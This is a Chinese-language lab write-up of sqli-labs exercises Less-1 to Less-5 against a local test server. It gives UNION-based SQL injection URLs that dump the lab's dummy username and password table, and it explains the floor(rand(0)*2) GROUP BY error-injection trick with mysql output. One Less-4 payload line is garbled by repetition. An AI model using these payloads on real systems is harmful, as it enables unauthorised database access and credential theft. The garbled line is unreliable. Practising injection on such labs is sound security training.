+<li><p><strong>user_privileges</strong>【用户权限表：给出了关于全程权限的信息。该信息源自<strong>mysql.user</strong>授权表，是非标准表。</p></li>
+<li><p><strong>schema_privileges</strong>【方案权限表：给出了关于方案【数据库权限的信息。该信息来自<strong>mysql.db</strong>授权表，是非标准表。</p></li>
+<li><p><strong>table_privileges</strong>【表权限表：给出了关于表权限的信息。该信息源自<strong>mysql.tables_priv</strong>授权表，是非标准表。</p></li>
+<li><p><strong>column_privileges</strong>【列权限表：给出了关于列权限的信息。该信息源自<strong>mysql.columns_priv</strong>授权表。是非标准表。</p></li>
+<li><p><strong>character_sets</strong>【字符集表：提供了mysql实例可用字符集的信息。命令<strong>show
+character set</strong>;结果集取之此表。</p></li>
+<li><p><strong>collations</strong>表：提供了关于各字符集的对照信息。</p></li>
+<li><p><strong>collation_character_set_applicability</strong>表：指明了可用于校对的字符集。这些列等效于<strong>show
+collation;</strong>的前两个显示字段。</p></li>
+<li><p><strong>table_constraints</strong>表：描述了存在约束的表，以及表的约束类型。</p></li>
+<li><p><strong>key_column_usage</strong>表：描述了具有约束的键列。</p></li>
+<li><p><strong>routines</strong>表：提供了关于存储子程序【存储程序和函数的信息。此时，<strong>routines</strong>表不包含自定义函数【<strong>udf</strong>。名为<strong>mysql.proc
+name</strong>的列指明了对应于<strong>information_schema.routines</strong>表的<strong>mysql.proc</strong>表列。</p></li>
+<li><p><strong>views</strong>表：给出了关于数据库中的视图的信息。需要有<strong>show
+views</strong>权限，否则无法查看视图信息。</p></li>
+<li><p><strong>triggers</strong>表：提供了关于触发程序的信息。必须有<strong>super</strong>权限才能查看该表。</p></li>
+</ul>
+<p>然后继续构造式子，其中<strong>group_concat()</strong>这个函数的作用是拼接全部字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27; union select 1,TABLE_SCHEMA,group_concat(table_name) from information_schema.tables where table_schema like &#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
+<p>爆所有数据名。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>
+<p>得到当前库的所有表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure>
+<p>得到表中所有的字段名。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;table_name&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>得到字段具体的值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name,<span class="string">&#x27; &#x27;</span>,column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
+<p>得到字段名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where  table_name=&#x27;users&#x27; --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>
+<p>得到表中全部信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27; union select 1,2,group_concat(username,&#x27; &#x27;,password) from users --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4</span><br></pre></td></tr></table></figure>
+<h4 id="less-2-基于错误的get整型注入">Less-2 基于错误的GET整型注入</h4>
+<p>先在被挨打的边缘试探一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-2/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
+<p>根据返回的错误来看，没有数值即为整型注入，因为<strong>sql</strong>语句对于数字型的数据可以不加单引号闭合，不加注释，于是构造<strong>?id=1
+and 1=1</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-2/?id=1 and 1=1</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
+<p>有返回值，可以继续注入，后续步骤一如Less-1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-2/?id=-1 union select 1,2,group_concat(username,&#x27; &#x27;,password) from users</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4 </span><br></pre></td></tr></table></figure>
+<h4 id="less-3-基于错误的get单引号变形字符型注入">Less-3
+基于错误的GET单引号变形字符型注入</h4>
+<p>再次在被挨打的边缘试探一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-3/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
+<p>可以知道后端的<strong>sql</strong>语句在接收的参数两边加上了小括号，于是构造如下语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-3/?id=-1&#x27;) or &#x27;1&#x27;=&#x27;1&#x27; --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
+<p>然后还是像<strong>Less-1</strong>一样的后续。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-3/?id=-1&#x27;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4 </span><br></pre></td></tr></table></figure>
+<h4 id="less-4-基于错误的get双引号变形字符型注入">Less-4
+基于错误的GET双引号变形字符型注入</h4>
+<p>试探。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-4/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
+<p>无报错信息，故推测单引号可能被双引号包含从而闭合，因此构造双引号闭合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-4/?id=1&quot;) or 1=1 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
+<p>还是一样，故不赘述。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--sLess-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--s+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4 </span><br></pre></td></tr></table></figure>
+<h3 id="x01-get双查询注入">0x01 GET双查询注入</h3>
+<h4 id="less-5-基于双查询的get单引号字符型注入">Less-5
+基于双查询的GET单引号字符型注入</h4>
+<p>根据题意，这是一个双查询单引号字符型注入，即将<strong>Group
+by</strong>与一个聚合函数一起嵌套使用，例如**count(*)**，可以将查询的部分内容作为错误信息返回。也就发展为今天的二次注入查询。</p>
+<h4 id="原理补充"><a
+target="_blank" rel="noopener" href="https://www.2cto.com/article/201604/498394.html">原理补充</a></h4>
+<h5 id="x00-对比语句">0x00 对比语句</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(database(),floor(rand(0)*2)) as a from information_schema.tables group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;security1&#x27; for key &#x27;group_key</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;security1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<p>这两句查询语句的差异是<strong>floor()</strong>函数位置的不同，但多次测试的结果都是一致表明报错与语句中函数位置无关。</p>
+<h5 id="x01-测试rand0">0x01 测试rand(0)</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table users(id int(10),username char(20),password char(20));</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into users(id,username,password) VALUE (1,&#x27;test1&#x27;,&#x27;test1&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users group by concat(database(),floor(rand(0)*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>执行多次没有报错，尝试增加数据再进行尝试，直到第三条数据插入后，出现了错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users group by concat(database(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;test1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<h5 id="x02-测试rand">0x02 测试rand()</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table users1(id int(10),username char(20),password char(20));</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">insert into users1(id,username,password) VALUE (1,&#x27;test1&#x27;,&#x27;test1&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>依旧执行多次没有报错。</p>
+<p>在插入第二条数据测试后出现错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;test0&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<h5 id="x03-多数据测试">0x03 多数据测试</h5>
+<p>使用<strong>rand()</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand()*2) from users;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand()*2) from users;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">+-----------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand()*2) from users;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>多次测试发现结果都不同，然后使用<strong>rand(0)</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from users;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand(0)*2) from users;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand(0)*2) from users;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>多次测试结果一样。</p>
+<h5 id="x04-虚拟表">0x04 虚拟表</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | admin    | admin      |</span><br><span class="line">| 16 | admin    | admin      |</span><br><span class="line">| 17 | admin    | admin      |</span><br><span class="line">| 18 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,count(*) from users group by username;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | count(*) |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    |        5 |</span><br><span class="line">| admin1   |        1 |</span><br><span class="line">| admin2   |        1 |</span><br><span class="line">| admin3   |        1 |</span><br><span class="line">| admin4   |        1 |</span><br><span class="line">| Angelina |        1 |</span><br><span class="line">| batman   |        1 |</span><br><span class="line">| dhakkan  |        1 |</span><br><span class="line">| Dumb     |        1 |</span><br><span class="line">| Dummy    |        1 |</span><br><span class="line">| secure   |        1 |</span><br><span class="line">| stupid   |        1 |</span><br><span class="line">| superman |        1 |</span><br><span class="line">+----------+----------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>sql</strong>查询在使用<strong>group
+by()</strong>这个函数分组的时候，会建立一张虚拟表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+</span><br><span class="line">| username | count(*) |</span><br><span class="line">+----------+----------+</span><br><span class="line">|          |          |</span><br><span class="line">|          |          |</span><br><span class="line">|          |          |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>
+<p>然后开始查询数据库，取出数据库数据看虚拟表中是否存在。</p>
+<p>不存在则将要分组的数据插入虚拟表中以待最后输出，存在则执行<strong>count++</strong>。</p>
+<h5 id="x05-rand0函数">0x05 rand(0)函数</h5>
+<p><strong>rand()</strong>函数在查询的时候使用时会被执行多次计算结果值，且当种子值固定时，**floor(rand(0)*2)<strong>得出的值是也是固定的，为</strong>011011001110111**……【画重点。</p>
+<p>而上文的多次计算结果值这个操作，即使用<strong>group
+by()</strong>分组的时候计算一次，倘若虚拟表中无该字段，则插入表中的时候再次计算一次。</p>
+<p>先取第一条记录，第一次计算<strong>floor(rand(0)<em>2)=0<strong>，虚拟表中无第一条记录，于是插入的时候第二次计算</strong>floor(rand(0)</em>2)=1</strong>，然后将结果插入。</p>
